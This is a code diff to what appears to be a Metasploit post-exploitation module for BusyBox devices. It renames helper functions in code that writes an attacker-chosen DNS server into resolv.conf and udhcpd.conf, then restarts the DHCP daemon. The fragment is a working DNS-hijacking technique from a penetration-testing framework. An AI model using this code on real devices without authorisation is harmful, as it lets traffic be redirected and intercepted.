@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Post
 
   def modify_resolv_conf
     print_status('File /etc/resolv.conf found')
-    if busybox_write_file('/etc/resolv.conf', "nameserver #{datastore['SRVHOST']}", false)
+    if busy_box_write_file('/etc/resolv.conf', "nameserver #{datastore['SRVHOST']}", false)
       print_good('DNS server added to resolv.conf')
     end
   end
@@ -51,17 +51,17 @@ class Metasploit3 < Msf::Post
   def modify_udhcpd_conf
     print_status('File /etc/udhcpd.conf found')
 
-    if busybox_write_file('/etc/udhcpd.conf', "option dns #{datastore['SRVHOST']}", true)
+    if busy_box_write_file('/etc/udhcpd.conf', "option dns #{datastore['SRVHOST']}", true)
       restart_dhcpd('/etc/udhcpd.conf')
     else
       print_status('Unable to write udhcpd.conf, searching a writable directory...')
-      writable_directory = get_writable_directory
+      writable_directory = busy_box_writable_dir
       if writable_directory
         print_status("Copying the original udhcpd.conf to #{writable_directory}tmp.conf")
         cmd_exec("cp -f /etc/udhcpd.conf #{writable_directory}tmp.conf")
         Rex::sleep(0.3)
         print_status("Adding DNS to #{writable_directory}tmp.conf")
-        busybox_write_file("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", true)
+        busy_box_write_file("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", true)
         restart_dhcpd("#{writable_directory}tmp.conf")
       else
         print_error('Writable directory not found')
